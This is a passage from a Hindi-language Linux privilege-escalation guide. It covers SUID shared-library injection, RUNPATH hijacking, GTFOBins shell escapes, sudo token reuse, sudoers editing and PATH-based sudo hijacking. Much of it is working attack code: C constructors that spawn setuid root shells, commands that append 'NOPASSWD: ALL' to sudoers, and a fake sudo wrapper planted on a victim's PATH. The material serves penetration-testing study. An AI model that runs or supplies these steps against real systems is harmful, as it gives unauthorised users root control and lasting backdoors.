рдЬрдм рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде **SUID** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ рдЬреЛ рдЕрд╕рд╛рдорд╛рдиреНрдп рд▓рдЧрддреА рд╣реИ, рддреЛ рдпрд╣ рдЕрдЪреНрдЫреА рдкреНрд░рдерд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рдХрд┐ рдХреНрдпрд╛ рдпрд╣ **.so** рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░ рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рддреНрд░реБрдЯрд┐ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдЬреИрд╕реЗ _"open(тАЬ/path/to/.config/libcalc.soтАЭ, O\_RDONLY) = -1 ENOENT (рдХреЛрдИ рдРрд╕рд╛ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдирд╣реАрдВ рд╣реИ)"_ рдПрдХ рд╢реЛрд╖рдг рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╕реБрдЭрд╛рддрд╛ рд╣реИред

рдЗрд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдИ рдПрдХ рд╕реА рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдЧреЗ рдмрдврд╝реЗрдВрдЧреЗ, рдорд╛рди рд▓реАрдЬрд┐рдП _"/path/to/.config/libcalc.c"_, рдЬрд┐рд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рд╣реЛрдЧрд╛:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
рдпрд╣ рдХреЛрдб, рдПрдХ рдмрд╛рд░ рдХрдВрдкрд╛рдЗрд▓ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рдкрд░, рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдорд╛рдирд┐рдкреБрд░рд┐рдд рдХрд░рдХреЗ рдФрд░ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╢реИрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд░рдЦрддрд╛ рд╣реИред

рдЙрдкрд░реЛрдХреНрдд рд╕реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ рд╕рд╛рдЭрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ (.so) рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## рд╕рд╛рдЭрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
рдЕрдм рдЬрдм рд╣рдореЗрдВ рдПрдХ SUID рдмрд╛рдЗрдирд░реА рдорд┐рд▓ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдПрдХ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рд╣реИ рдЬрд╣рд╛рдБ рд╣рдо рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдирд╛рдо рдХреА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдмрдирд╛рдПрдВ:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
рдпрджрд┐ рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреНрд░реБрдЯрд┐ рдорд┐рд▓рддреА рд╣реИ:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЬрд┐рд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдЖрдкрдиреЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рд╣реИ, рдЙрд╕рдореЗрдВ `a_function_name` рдирд╛рдордХ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) рдПрдХ рдЪрдпрдирд┐рдд рд╕реВрдЪреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ Unix рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред [**GTFOArgs**](https://gtfoargs.github.io/) рдПрдХ рд╕рдорд╛рди рд╕реВрдЪреА рд╣реИ рд▓реЗрдХрд┐рди рдЙрд╕рдХреЗ рд▓рд┐рдП рдорд╛рдорд▓реЗ рдЬрд╣рд╛рдВ рдЖрдк **рдХреЗрд╡рд▓ рддрд░реНрдХ рдЗрдВрдЬреЗрдХреНрд╢рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдкрд░рд┐рдпреЛрдЬрдирд╛ Unix рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЗ рд╡реИрдз рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддреА рд╣реИ рдЬреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╢реИрд▓рд┐рдпреЛрдВ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ, рдЙрдЪреНрдЪ рд╡рд░реНрдЪрд╕реНрд╡ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдпрд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ, рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ, рдмрд╛рдЗрдВрдб рдФрд░ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓рд┐рдпреЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ, рдФрд░ рдЕрдиреНрдп рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

рдпрджрд┐ рдЖрдк `sudo -l` рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЯреВрд▓ [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХреЗ рдХрд┐ рдХреЛрдИ рд╕реБрдбреЛ рдирд┐рдпрдо рдХреИрд╕реЗ рд╢рд╛рддрд┐рд░рддрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### Sudo рдЯреЛрдХрди рдХрд╛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ

рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ **sudo рдПрдХреНрд╕реЗрд╕** рд╣реИ рд▓реЗрдХрд┐рди рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рд╣реИ, рдЖрдк **sudo рдХрдорд╛рдВрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдХреЗ рдФрд░ рдлрд┐рд░ рд╕рддреНрд░ рдЯреЛрдХрди рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдХреЗ** рд╡рд░реНрдЪрд╕реНрд╡ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рд╡рд░реНрдЪрд╕реНрд╡ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ:

* рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "_рдирдореВрдирд╛рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛_" рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реИрд▓реА рд╣реИ
* "_рдирдореВрдирд╛рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛_" рдиреЗ **`sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдХреЗ рдХреБрдЫ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдкрд┐рдЫрд▓реЗ 15 рдорд┐рдирдЯреЛрдВ** рдореЗрдВ рдХреБрдЫ рдХрд┐рдпрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ рд╕рдордп рд╣реИ рдЬреЛ рд╣рдореЗрдВ рдХрд┐рд╕реА рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рджрд░реНрдЬ рдХрд┐рдП рдмрд┐рдирд╛ `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ)
* `cat /proc/sys/kernel/yama/ptrace_scope` 0 рд╣реИ
* `gdb` рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИ (рдЖрдк рдЗрд╕реЗ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)

(рдЖрдк рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ `ptrace_scope` рдХреЛ `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` рдХреЗ рд╕рд╛рде рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ `/etc/sysctl.d/10-ptrace.conf` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ `kernel.yama.ptrace_scope = 0` рд╕реЗрдЯ рдХрд░рдХреЗ)

рдпрджрд┐ рд╕рднреА рдпреЛрдЧреНрдпрддрд╛рдПрдБ рдкреВрд░реА рд╣реЛрддреА рд╣реИрдВ, **рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд░реНрдЪрд╕реНрд╡ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **рдкрд╣рд▓рд╛ рдЙрддреНрдкреАрдбрд╝рди** (`exploit.sh`) _/tmp/_ рдореЗрдВ `activate_sudo_token` рдирд╛рдордХ рдмрд╛рдЗрдирд░реА рдмрдирд╛рдПрдЧрд╛ред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЕрдкрдиреЗ рд╕рддреНрд░ рдореЗрдВ рд╕реБрдбреЛ рдЯреЛрдХрди рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЖрдкрдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд░реВрдЯ рд╢реИрд▓реА рдирд╣реАрдВ рдорд┐рд▓реЗрдЧреА, `sudo su` рдХрд░реЗрдВ):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* рджреВрд╕рд░рд╛ рдЙрддреНрдкреАрдбрд╝рди (`exploit_v2.sh`) _/tmp_ рдореЗрдВ рдПрдХ sh рд╢реИрд▓ рдмрдирд╛рдПрдЧрд╛ **рдЬрд┐рд╕рдХрд╛ рдорд╛рд▓рд┐рдХ рд░реВрдЯ рд╣реЛрдЧрд╛ рдФрд░ рд╕реЗрдЯрдпреВрдЖрдЗрдб рд╣реЛрдЧрд╛**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* рддреАрд╕рд░рд╛ рдЙрддреНрдкреАрдбрд╝рди (`exploit_v3.sh`) **рдПрдХ рд╕реБрдбреЛрдЕрд░реНрд╕ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдЧрд╛** рдЬреЛ **рд╕реБрдбреЛ рдЯреЛрдХрди рдХреЛ рд╢рд╛рд╢реНрд╡рдд рдмрдирд╛рдПрдЧрд╛ рдФрд░ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реБрдбреЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рджреЗрдЧрд╛**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛>

рдпрджрд┐ рдЖрдкрдХреЛ рдЗрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдмрдирд╛рдП рдЧрдП рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐** рд╣реИ, рддреЛ рдЖрдк [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) рдирд╛рдордХ рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ PID рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реБрдбреЛ рдЯреЛрдХрди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк _/var/run/sudo/ts/sampleuser_ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ PID 1234 рдХреЗ рд╕рд╛рде рдПрдХ рд╢реИрд▓ рд╣реИ, рддреЛ рдЖрдк **рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рд╕реБрдбреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

рдлрд╝рд╛рдЗрд▓ `/etc/sudoers` рдФрд░ рдлрд╝реЛрд▓реНрдбрд░ `/etc/sudoers.d` рдХреЗ рдЕрдВрджрд░ рдХреЗ рдлрд╝рд╛рдЗрд▓реЗрдВ `sudo` рдХреМрди рдФрд░ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреА рд╣реИред рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд░реВрдЯ рдФрд░ рд╕рдореВрд╣ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдкрдврд╝реА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
**рдЕрдЧрд░** рдЖрдк **рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЕрдЧрд░ рдЖрдк **рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
рдпрджрд┐ рдЖрдк рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

рдХреБрдЫ рд╡рд┐рдХрд▓реНрдк `sudo` рдмрд╛рдЗрдирд░реА рдХреЗ рд▓рд┐рдП `doas` рдЬреИрд╕реЗ OpenBSD рдХреЗ рд▓рд┐рдП рд╣реИрдВ, `/etc/doas.conf` рдкрд░ рдЗрд╕рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдирд╛ рди рднреВрд▓реЗрдВред
```
permit nopass demo as root cmd vim
```
### рд╕реБрдбреЛ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рд╣реИ рдХрд┐ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╛рдорд╛рдиреНрдпрдд: рдПрдХ рдорд╢реАрди рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИ** рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рдирдпрд╛ рд╕реБрдбреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдЖрдкрдХреЗ рдХреЛрдб рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдФрд░ рдлрд┐рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдХрдорд╛рдВрдб рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░реЗрдЧрд╛ред рдлрд┐рд░, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рдХрд╛ $PATH рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП .bash\_profile рдореЗрдВ рдирдпрд╛ рдкрде рдЬреЛрдбрд╝рдирд╛) рддрд╛рдХрд┐ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реБрдбреЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХрд╛ рд╕реБрдбреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рд╣реЛрддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╢реИрд▓реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рдмреИрд╢ рдирд╣реАрдВ) рддреЛ рдЖрдкрдХреЛ рдирдП рдкрде рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЖрдк [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py) рдореЗрдВ рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╛ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдХреБрдЫ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo тАШexport PATH=/tmp:$PATHтАЩ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп

### ld.so

рдлрд╝рд╛рдЗрд▓ `/etc/ld.so.conf` рджрд░реНрд╢рд╛рддреА рд╣реИ **рдХрд┐ рд▓реЛрдб рдХреА рдЧрдИ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдХрд╣рд╛рдБ рд╕реЗ рд╣реИрдВ**ред рд╕рд╛рдорд╛рдиреНрдпрдд: рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрде рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ: `include /etc/ld.so.conf.d/*.conf`

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ `/etc/ld.so.conf.d/*.conf` рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝реА рдЬрд╛рдПрдВрдЧреАред рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ **рдЕрдиреНрдп рдлрд╝реЛрд▓реНрдбрд░реНрд╕** рдХреА рдУрд░ **рд▓рд╛рдЗрдмреНрд░реЗрд░реА** рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП **рдкреЙрдЗрдВрдЯ рдХрд░рддреА рд╣реИрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `/etc/ld.so.conf.d/libc.conf` рдХрд╛ рд╡рд┐рд╖рдп `/usr/local/lib` рд╣реИред **рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд┐рд╕реНрдЯрдо `/usr/local/lib` рдХреЗ рдЕрдВрджрд░ рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝ рдХреА рдЦреЛрдЬ рдХрд░реЗрдЧрд╛**ред

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ **рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ** рдХрд┐рд╕реА рднреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрде рдкрд░: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` рдХреЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдпрд╛ `/etc/ld.so.conf.d/*.conf` рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдкрд░, рддреЛ рдЙрд╕реЗ рд╡рд░реНрдЪрд╕реНрд╡ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрд░ **рдЗрд╕ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рд╢реЛрдз рдХреИрд╕реЗ рдХрд░реЗрдВ** рдЗрд╕реЗ рджреЗрдЦреЗрдВ:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
